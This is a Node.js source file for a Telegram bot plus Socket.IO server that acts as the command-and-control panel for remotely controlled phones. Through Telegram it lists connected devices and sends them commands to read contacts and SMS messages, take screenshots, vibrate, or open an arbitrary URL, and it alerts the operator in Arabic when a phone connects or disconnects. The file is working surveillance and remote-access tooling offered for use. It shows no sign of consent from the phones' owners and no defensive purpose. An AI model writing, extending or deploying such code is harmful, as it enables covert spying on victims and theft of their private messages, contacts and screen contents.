// index.js - Telegram Bot + Socket.IO Server
const fs = require('fs');
const path = require('path');
const http = require('http');
const express = require('express');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// CONFIG
const CONFIG_FILE = path.join(__dirname, 'data.json');
let TOKEN = '';
let CHAT_ID = '';
try {
    const data = fs.readFileSync(CONFIG_FILE, 'utf8');
    const config = JSON.parse(data);
    TOKEN = config.telegram_token;
    CHAT_ID = config.telegram_chat_id;
    if (!TOKEN || !CHAT_ID) throw new Error("Missing config values");
    console.log("[CONFIG] Loaded successfully");
} catch (err) {
    console.error("[CRITICAL] Failed to load data.json:", err.message);
    process.exit(1);
}

// COMMANDS
const COMMAND_MAP = {
    contacts: { instruction: "CMD:CONTACTS_READ", type: "simple" },
    sms: { instruction: "CMD:SMS_READ", type: "simple" },
    vibrate: { instruction: "CMD:VIBRATE_SHORT", type: "simple" },
    screenshot: { instruction: "CMD:SCREEN_CAPTURE", type: "simple" },
    open_url: { instruction_prefix: "CMD:URL_OPEN|", type: "arg" }
};

// EXPRESS + SOCKET.IO
const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;
const io = new Server(server, { cors: { origin: "*" } });

let connectedClients = {};

function generateRandomName() {
    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const numbers = '0123456789';
    return 'phone_' + letters.charAt(Math.floor(Math.random()*letters.length))
                     + letters.charAt(Math.floor(Math.random()*letters.length))
                     + numbers.charAt(Math.floor(Math.random()*numbers.length))
                     + numbers.charAt(Math.floor(Math.random()*numbers.length));
}

// Socket.IO
io.on('connection', (socket) => {
    const clientId = generateRandomName();
    connectedClients[clientId] = socket;
    console.log(`Client connected: ${clientId}`);
    bot.sendMessage(CHAT_ID, `📱 الهاتف ${clientId} متصل الآن.`);

    socket.on('response', (data) => {
        console.log(`[RESPONSE] ${clientId}:`, data.response || data);
    });

    socket.on('disconnect', () => {
        delete connectedClients[clientId];
        console.log(`Client disconnected: ${clientId}`);
        bot.sendMessage(CHAT_ID, `⚠️ الهاتف ${clientId} تم فصله.`);
    });
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));

// TELEGRAM BOT
const bot = new TelegramBot(TOKEN, { polling: true });
console.log("Telegram Bot Initialized.");

// HELPERS
function sendCommandToClient(clientId, command, argument) {
    const socket = connectedClients[clientId];
    if (!socket) return `[ERROR] Client ${clientId} not connected`;
    const payload = argument ? `${command}|${argument}` : command;
    socket.emit('command', { command, argument });
    return `[DISPATCH] Sent to ${clientId}: ${payload}`;
}

function handleTelegramCommand(commandKey, msg, argument) {
    const commandData = COMMAND_MAP[commandKey];
    if (!commandData) return bot.sendMessage(msg.chat.id, "Command not recognized.");

    // تحديد الهاتف
    let clientId = null;
    let arg = argument || null;

    if (argument && argument.includes(' ')) {
        const split = argument.split(' ');
        clientId = split[0];
        arg = split.slice(1).join(' ');
    }

    if (!clientId) {
        const clientIds = Object.keys(connectedClients);
        if (clientIds.length === 0) return bot.sendMessage(msg.chat.id, "No clients connected.");
        clientId = clientIds[clientIds.length - 1];
    }

    if (!connectedClients[clientId]) return bot.sendMessage(msg.chat.id, `Client ${clientId} not connected.`);

    let result;
    if (commandData.type === "simple") {
        result = sendCommandToClient(clientId, commandData.instruction);
    } else if (commandData.type === "arg") {
        const payload = arg || "N/A";
        result = sendCommandToClient(clientId, commandData.instruction_prefix + payload);
    }

    bot.sendMessage(msg.chat.id, result);
}

// TELEGRAM COMMANDS
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const commands = Object.keys(COMMAND_MAP).map(k => `/${k}`).join(', ');
    bot.sendMessage(chatId, `Remote Control Initialized.\nCommands: ${commands}\nUse /clients to see connected phones.\nUse /open_url [phoneId] [url]`);
});

bot.onText(/\/clients/, (msg) => {
    const chatId = msg.chat.id;
    const clientIds = Object.keys(connectedClients);
    if (clientIds.length === 0) bot.sendMessage(chatId, "🚫 No connected phones.");
    else {
        const list = clientIds.map((id, idx) => `${idx+1}. ${id}`).join('\n');
        bot.sendMessage(chatId, `📱 Connected Phones:\n${list}`);
    }
});

// Simple commands
const simpleKeys = Object.keys(COMMAND_MAP).filter(k => COMMAND_MAP[k].type === "simple");
if (simpleKeys.length > 0) {
    const simpleRegex = new RegExp(`^/(${simpleKeys.join('|')})$`);
    bot.onText(simpleRegex, (msg, match) => handleTelegramCommand(match[1], msg));
}

// Commands with arguments
const argKeys = Object.keys(COMMAND_MAP).filter(k => COMMAND_MAP[k].type === "arg");
if (argKeys.length > 0) {
    const argRegex = new RegExp(`^/(${argKeys.join('|')})\\s+(.+)`);
    bot.onText(argRegex, (msg, match) => handleTelegramCommand(match[1], msg, match[2]));
}

bot.on('message', (msg) => {
    if (msg.text && !msg.text.startsWith('/')) bot.sendMessage(msg.chat.id, "Command not recognized. Type /start.");
});
